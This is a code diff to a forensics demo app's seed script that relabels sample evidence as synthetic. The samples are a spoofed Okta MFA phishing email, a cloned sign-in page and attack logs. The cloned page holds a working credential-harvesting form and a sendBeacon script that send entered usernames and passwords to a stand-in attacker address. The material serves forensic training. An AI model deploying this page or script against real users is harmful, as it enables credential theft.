@@ -137,13 +137,15 @@ export function runSeed() {
     timeOffset(250)
   );
 
-  // 3. Create Real Evidence Files with Authentic Forensic Payloads
-  const emlContent = `Received: from mailout-relay.attacker-net.org (mailout-relay.attacker-net.org [198.51.100.44])
+  // 3. Create Synthetic Evidence Files for Safe Demonstration & Testing
+  // All demo artifacts use RFC 5737 documentation IP blocks (198.51.100.0/24) and fictitious domains
+  const emlContent = `X-TraceLock-Demo: [SYNTHETIC DEMO EVIDENCE - FOR SIMULATION & TESTING ONLY]
+Received: from mailout-relay.attacker-net.org (mailout-relay.attacker-net.org [198.51.100.44])
 	by mx1.corporate-gateway.net with ESMTP id 4Qx8W109mZz8219
 	for <vp-finance@corporate-gateway.net>; Wed, 18 Nov 2026 08:35:12 +0000 (UTC)
 From: "Okta Security Team" <security-alerts@login-okta-securesync.com>
 To: <vp-finance@corporate-gateway.net>
-Subject: URGENT: Mandatory Multi-Factor Authentication (MFA) Re-Authentication
+Subject: [DEMO LAB] URGENT: Mandatory Multi-Factor Authentication (MFA) Re-Authentication
 Date: Wed, 18 Nov 2026 08:35:08 +0000
 Message-ID: <202611180835.SEC99214@mailout-relay.attacker-net.org>
 MIME-Version: 1.0
@@ -154,6 +156,7 @@ X-Originating-IP: [198.51.100.44]
 <!DOCTYPE html>
 <html>
 <body>
+<p><em>[SYNTHETIC DEMO ARTIFACT - SIMULATED PHISHING MESSAGE]</em></p>
 <p>Dear Corporate User,</p>
 <p>An anomalous login attempt was detected against your Okta Single Sign-On account from <strong>Warsaw, Poland</strong>.</p>
 <p>To preserve access to corporate financial systems, you must re-verify your MFA token within 60 minutes:</p>
@@ -163,14 +166,17 @@ X-Originating-IP: [198.51.100.44]
 </html>`;
 
   const htmlContent = `<!DOCTYPE html>
+<!-- [SYNTHETIC DEMO EVIDENCE - ACADEMIC LAB SIMULATION ONLY] -->
+<!-- Fictitious credential harvester mock for forensic analysis demonstration -->
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Corporate Identity Gateway - Sign In</title>
+  <title>Corporate Identity Gateway - Sign In (Simulated Phish)</title>
   <!-- Rogue Harvester Captured DOM -->
 </head>
 <body style="background:#f4f5f7; font-family: sans-serif;">
   <div style="width: 380px; margin: 100px auto; background: #fff; padding: 30px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+    <div style="font-size: 11px; color: #e53e3e; font-weight: bold; margin-bottom: 8px;">[SYNTHETIC LAB ARTIFACT]</div>
     <h2 style="color: #007dc1;">Single Sign-On Verification</h2>
     <form id="phishForm" action="https://198.51.100.44/api/harvest" method="POST">
       <input type="text" name="username" placeholder="Username / Email" style="width: 100%; margin-bottom: 12px; padding: 8px;" />
@@ -179,7 +185,7 @@ X-Originating-IP: [198.51.100.44]
       <button type="submit" style="background:#007dc1; color:#fff; width:100%; padding:10px; border:none; cursor:pointer;">Authenticate</button>
     </form>
     <script>
-      // Malicious payload captured by DFIR team
+      // Simulated exfiltration beacon
       document.getElementById('phishForm').addEventListener('submit', function(e) {
         navigator.sendBeacon('https://198.51.100.44/exfil', new FormData(this));
       });
@@ -188,7 +194,9 @@ X-Originating-IP: [198.51.100.44]
 </body>
 </html>`;
 
-  const logContent = `2026-11-18 08:42:15 UTC [POST] /auth/login?session=a7f90e82b - 198.51.100.44 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 200 OK - Payload: {user: "vp-finance@corporate-gateway.net", action: "harvest"}
+  const logContent = `# [SYNTHETIC DEMO LOGS - FOR SIMULATION & TESTING ONLY]
+# RFC 5737 Documentation Network 198.51.100.0/24
+2026-11-18 08:42:15 UTC [POST] /auth/login?session=a7f90e82b - 198.51.100.44 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 200 OK - Payload: {user: "vp-finance@corporate-gateway.net", action: "harvest"}
 2026-11-18 08:42:29 UTC [POST] /api/harvest - 198.51.100.44 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 200 OK - MFA Token Captured: 492810
 2026-11-18 08:45:02 UTC [AUTH] Real Corporate Okta Gateway - Login Attempt for vp-finance from 198.51.100.44 (Warsaw, Poland) - MFA Failed (Challenge Expired)
 2026-11-18 08:50:11 UTC [ALERT] CrowdStrike EDR Agent - Host WORKSTATION-FIN-08 isolated from network.
@@ -223,8 +231,8 @@ X-Originating-IP: [198.51.100.44]
       filename: 'urgent_mfa_update_notification.eml',
       mime: 'message/rfc822',
       buffer: Buffer.from(emlContent, 'utf-8'),
-      desc: 'Raw RFC 822 email message with spoofed Okta branding and deceptive urgency link. Originated from rogue IP 198.51.100.44.',
-      source: 'Microsoft Exchange Journaling Gateway',
+      desc: '[SYNTHETIC DEMO EVIDENCE] Raw RFC 822 email message with spoofed Okta branding and deceptive urgency link. Originated from synthetic IP 198.51.100.44.',
+      source: 'Microsoft Exchange Journaling Gateway (Synthetic Lab)',
       createdAt: timeOffset(260),
     },
     {
@@ -234,8 +242,8 @@ X-Originating-IP: [198.51.100.44]
       filename: 'credential_harvesting_portal_clone.html',
       mime: 'text/html',
       buffer: Buffer.from(htmlContent, 'utf-8'),
-      desc: 'Live DOM dump of rogue credential harvesting landing page mimicing Okta Identity SSO with JavaScript exfiltration beacon.',
-      source: 'Chromium Headless Web Sandbox Inspection',
+      desc: '[SYNTHETIC DEMO EVIDENCE] Live DOM dump of simulated credential harvesting landing page mimicking Okta Identity SSO with beacon script.',
+      source: 'Chromium Headless Web Sandbox Inspection (Lab)',
       createdAt: timeOffset(240),
     },
     {
@@ -245,8 +253,8 @@ X-Originating-IP: [198.51.100.44]
       filename: 'auth_gateway_access_traffic.log',
       mime: 'text/plain',
       buffer: Buffer.from(logContent, 'utf-8'),
-      desc: 'Reverse proxy web server and gateway access logs showing adversary POST harvest calls and token submission times.',
-      source: 'Perimeter NGINX Reverse Proxy Logs',
+      desc: '[SYNTHETIC DEMO EVIDENCE] Reverse proxy web server and gateway access logs showing adversary POST harvest calls and token submission times.',
+      source: 'Perimeter NGINX Reverse Proxy Logs (Lab)',
       createdAt: timeOffset(210),
     },
     {
@@ -256,8 +264,8 @@ X-Originating-IP: [198.51.100.44]
       filename: 'perimeter_firewall_pcap_sample.pcap',
       mime: 'application/vnd.tcpdump.pcap',
       buffer: pcapBuffer,
-      desc: 'Full packet capture of TLS handshake and HTTP transmission between victim workstation and adversary C2 server 198.51.100.44.',
-      source: 'Palo Alto Perimeter Firewall Mirror Port',
+      desc: '[SYNTHETIC DEMO EVIDENCE] Packet capture sample of HTTP transmission between victim workstation and lab test server 198.51.100.44.',
+      source: 'Firewall Mirror Port (Synthetic Capture)',
       createdAt: timeOffset(180),
     },
   ];
@@ -571,7 +579,7 @@ X-Originating-IP: [198.51.100.44]
     uuidv4(),
     case1Id,
     adminId,
-    'Legal has reviewed the custody ledger. All 4 evidence artifacts have unbroken cryptographic hash chains. Admissibility and evidentiary preservation standards satisfied.',
+    'Audit review completed on the custody ledger. All 4 evidence artifacts have unbroken cryptographic hash chains. Evidence integrity and hash records verified intact.',
     0,
     timeOffset(80),
     timeOffset(80)
